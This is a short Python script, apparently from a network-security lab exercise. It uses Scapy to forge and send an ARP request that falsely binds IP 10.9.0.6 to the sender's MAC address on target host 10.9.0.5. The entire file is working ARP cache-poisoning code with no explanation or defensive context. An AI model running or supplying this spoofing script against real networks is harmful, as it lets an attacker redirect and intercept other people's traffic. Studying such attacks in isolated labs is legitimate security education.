#!/usr/bin/env python3
from scapy.all import *

IP_target = "10.9.0.5"
MAC_target = "a2:0b:94:a7:7c:a3"
IP_spoofed = "10.9.0.6"
MAC_spoofed = "b6:cd:e6:cb:55:70"

print("Sending spoofed ARP request")

# construct the Ether header
E = Ether(
        src=MAC_spoofed,
        dst=MAC_target
        )
A = ARP(
        op=1,
        psrc=IP_spoofed,
        hwsrc=MAC_spoofed,
        pdst=IP_target
        )

pkt = E/A
sendp(pkt)